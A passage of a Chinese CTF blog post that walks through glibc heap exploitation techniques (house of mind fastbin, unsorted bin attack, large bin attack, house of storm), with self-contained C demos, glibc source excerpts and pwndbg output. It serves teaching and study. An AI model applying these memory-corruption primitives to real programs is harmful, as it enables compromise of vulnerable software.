Addr: 0x405470
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405580
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405690
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x405ec0
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x406380
Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="house-of-mind-fastbin-arena"><a href="#house-of-mind-fastbin-arena" class="headerlink" title="house_of_mind_fastbin(arena)"></a>house_of_mind_fastbin(arena)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
	int HEAP_MAX_SIZE &#x3D; 0x4000000;
	int MAX_SIZE &#x3D; (128*1024) - 0x100;
    
	uint8_t* fake_arena &#x3D; malloc(0x1000); 
	uint8_t* target_loc &#x3D; fake_arena + 0x30;

	uint8_t* target_chunk &#x3D; (uint8_t*) fake_arena - 0x10;

	fake_arena[0x888] &#x3D; 0xFF;
	fake_arena[0x889] &#x3D; 0xFF; 
	fake_arena[0x88a] &#x3D; 0xFF; 

	uint64_t new_arena_value &#x3D; (((uint64_t) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info &#x3D; (uint64_t*) new_arena_value;

	uint64_t* user_mem &#x3D; malloc(MAX_SIZE);
    
	while((long long)user_mem &lt; new_arena_value)&#123;
		user_mem &#x3D; malloc(MAX_SIZE);
	&#125;

	uint64_t* fastbin_chunk &#x3D; malloc(0x50); 
	uint64_t* chunk_ptr &#x3D; fastbin_chunk - 2; 
    
	uint64_t* tcache_chunks[7];
	for(int i &#x3D; 0; i &lt; 7; i++)&#123;
		tcache_chunks[i] &#x3D; malloc(0x50);
	&#125;	
	for(int i &#x3D; 0; i &lt; 7; i++)&#123;
		free(tcache_chunks[i]);
	&#125;

	fake_heap_info[0] &#x3D; (uint64_t) fake_arena; 
    
	chunk_ptr[1] &#x3D; 0x60 | 0x4; 
    
	free(fastbin_chunk); 
    
	assert(*((unsigned long *) (target_loc)) !&#x3D; 0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过伪造<code>arena</code>的<code>HEAP_MAX_SIZE、MAX_SIZE、system_mem</code>并申请到<code>fast bin</code>再释放来将一个<code>chunk</code>的内容为一个很大的值</p>
<p>其中需要绕过一个检查，即申请的内存不能大于<code>system_men</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (chunksize_nomask (victim) &lt;&#x3D; 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
				   &gt; av-&gt;system_mem, 0))
            malloc_printerr (&quot;malloc(): memory corruption&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0x1000</code>的堆用于伪造<code>arena</code>，由于没有刷新缓冲流所以有一个多出来的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x411

Allocated chunk | PREV_INUSE
Addr: 0x405660
Size: 0x1011

Top chunk | PREV_INUSE
Addr: 0x406670
Size: 0x1f991<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>0x888</code>的位置设置<code>system_men</code>大小为<code>0xFFFFFFFF</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x405ef0:	0x0000000000000000	0x0000000000ffffff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>以<code>MAX_SIZE</code>的大小创建堆直至满足<code>user_mem &lt; new_arena_value</code>的最多数量，由于<code>mmap_threshold=0x20000</code>所以创建的堆大小为<code>0x1ff00</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x411

Allocated chunk | PREV_INUSE
Addr: 0x405660
Size: 0x1011

Allocated chunk | PREV_INUSE
Addr: 0x406670
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x426580
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x446490
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x4663a0
Size: 0x1ff11
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>创建一个<code>fast bin</code>，将<code>fake_heap_info</code>的<code>ar_ptr</code>给设置成<code>fake_arena</code>并设置<code>fast bin</code>的<code>non_main_arena</code>标志位，再全部释放之后即可根据<code>heap_info</code>的<code>ar_ptr</code>找到我们的假chunk并更改chunk的内容达到目的</p>
<h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
	volatile unsigned long stack_var&#x3D;0;

	unsigned long *p&#x3D;malloc(0x410);
	malloc(500);
	free(p);
    
	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);
    
	malloc(0x410);
    
	assert(stack_var !&#x3D; 0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code>，大小大于<code>tcache</code></p>
<h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;assert.h&gt;
 
int main()
&#123;
    setbuf(stdout, NULL);

    unsigned long stack_var1 &#x3D; 0;
    unsigned long stack_var2 &#x3D; 0;

    unsigned long *p1 &#x3D; malloc(0x420);
    malloc(0x20);

    unsigned long *p2 &#x3D; malloc(0x500);
    malloc(0x20);

    unsigned long *p3 &#x3D; malloc(0x500);
    malloc(0x20);
 
    free(p1);
    free(p2);

    malloc(0x90);
    free(p3);

    p2[-1] &#x3D; 0x3f1;
    p2[0] &#x3D; 0;
    p2[2] &#x3D; 0;
    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);
    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);


    malloc(0x90);
 
    assert(stack_var1 !&#x3D; 0);
    assert(stack_var2 !&#x3D; 0);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用进入<code>large bin</code>插入的堆大小大于上一个堆的大小时会将上一个堆的<code>bk</code>和<code>bk_nextsize</code>的堆中写入当前堆的地址来实现改栈上地址为堆地址</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">while ((unsigned long) size &lt; chunksize_nomask (fwd))
                       &#123;
                         fwd &#x3D; fwd-&gt;fd_nextsize;
		  assert (chunk_main_arena (fwd));
                       &#125;

                     if ((unsigned long) size
		  &#x3D;&#x3D; (unsigned long) chunksize_nomask (fwd))
                       &#x2F;* Always insert in the second position.  *&#x2F;
                       fwd &#x3D; fwd-&gt;fd;
                     else
                       &#123;
                         victim-&gt;fd_nextsize &#x3D; fwd;
                         victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;
                         fwd-&gt;bk_nextsize &#x3D; victim;
                         victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;
                       &#125;
					bck &#x3D; fwd-&gt;bk;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先创建一个属于<code>small bin</code>的堆和两个属于<code>large bin</code>的堆，每个堆创建之后都要创建一个堆防止合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405680
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x4056b0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405bc0
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x405bf0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x406100
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x406130
Size: 0x1fed1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放两个堆，再创建一个小于第一个堆大小的堆，使得第一个堆还在<code>unsorted bin</code>但第二个堆进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4052f0
smallbins
empty
largebins
0x500: 0x4056b0 —▸ 0x7ffff7dd00d0 (main_arena+1168) ◂— 0x4056b0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放第三个堆进入<code>unsorted bin</code>，改第二个堆大小小于第三个堆并改<code>bk</code>和<code>bk_nextsize</code>为<code>stack_var1 - 0x10</code>，<code>stack_var2 - 0x20</code>,此时&#96;&#96;P2 -&gt; bk -&gt; fd &#x3D; stack_var1_addr  P2 -&gt; bk_nextsize -&gt; fd_nextsize &#x3D; stack_var2_addr&#96;</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405bf0 —▸ 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405bf0
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x4056b0 ◂— 0x0
BK: 0x4056b0 —▸ 0x7fffffffdd60 —▸ 0x405c00 ◂— 0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4056b0
0x4056b0:	0x0000000000000000	0x00000000000003f1
0x4056c0:	0x0000000000000000	0x00007fffffffdd60
0x4056d0:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>再次创建一个小的堆时第三个堆会进入<code>large bin</code>，此时会进行上面分析的操作使得第二个堆的<code>bk</code>和<code>bk_nextsize</code>中的栈地址的内容变成第三个堆地址</p>
<h3 id="house-of-storm-largebin-unsortedbin"><a href="#house-of-storm-largebin-unsortedbin" class="headerlink" title="house_of_storm(largebin + unsortedbin)"></a>house_of_storm(largebin + unsortedbin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char filler[0x60];
char target[0x60]; 

void init()&#123;
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
&#125;

int get_shift_amount(char* pointer)&#123;
	
	int shift_amount &#x3D; 0;
	long long ptr &#x3D; (long long)pointer;	
	
	while(ptr &gt; 0x20)&#123;
		ptr &#x3D; ptr &gt;&gt; 8; 
		shift_amount +&#x3D; 1; 
	&#125;	

	return shift_amount - 1; 
&#125;

int main()&#123;

	init();

    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	unsorted_bin &#x3D; malloc ( 0x4e8 );  
    
	malloc ( 0x18 ); 

	int shift_amount &#x3D; get_shift_amount(unsorted_bin);	
    
	size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);
	if(alloc_size &lt; 0x10)&#123;
		printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);
		puts(&quot;Chunk size is too small&quot;);
		exit(1);
	&#125;
	alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10; 
    if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;
    	return 1;
    &#125;

	if(alloc_size &lt; 0x410)&#123;
		for(int i &#x3D; 0; i &lt; 7; i++)&#123;
			tcaches[i] &#x3D; malloc(alloc_size);
		&#125;
		for(int i &#x3D; 0; i &lt; 7; i++)&#123;
			free(tcaches[i]);
		&#125;
	&#125;
	else&#123;
		puts(&quot;Not filling up the TCache&quot;);
	&#125;

	large_bin  &#x3D;  malloc ( 0x4d8 ); 
	malloc ( 0x18 );

	free ( large_bin ); 
	free ( unsorted_bin );

	unsorted_bin &#x3D; malloc(0x4e8);
	free(unsorted_bin);

	fake_chunk &#x3D; target - 0x10;

	((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; 
	(( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ; 
	(( size_t *) large_bin)[3] &#x3D; (size_t)fake_chunk - 0x18 - shift_amount; 

	
	ptr &#x3D; calloc(alloc_size, 1);
	strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);
	
	printf(&quot;String after %s\n&quot;, target);
	printf(&quot;Fake chunk ptr: %p\n&quot;, ptr);

	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理同<code>2.23</code>，<code>large bin</code>的应用同<code>2.27 large bin attack</code>，在<code>large bin attack</code>基础上利用<code>unsorted bin</code>实现任意地址分配</p>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/pwn/">
                                    <span class="chip bg-color">pwn</span>
                                </a>
                            
                                <a href="/tags/heap/">
                                    <span class="chip bg-color">heap</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="《格式化字符串》">
                        
                        <span class="card-title">《格式化字符串》</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            栈和非栈的格式化字符串
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/pwn/" class="post-category">
                                    pwn
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/pwn/">
                        <span class="chip bg-color">pwn</span>
                    </a>
                    
                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
                        <span class="chip bg-color">格式化字符串</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="《CSAPP》阅读笔记（持续更新）">
                        
                        <span class="card-title">《CSAPP》阅读笔记（持续更新）</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            深入理解计算机系统笔记
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-04
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" class="post-category">
                                    计算机系统
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/">
                        <span class="chip bg-color">计算机系统</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('20')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: StarrySky<br />'
            + '文章作者: StarrySky<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">StarrySky</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">43.2k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/starrysky1004" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>















    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
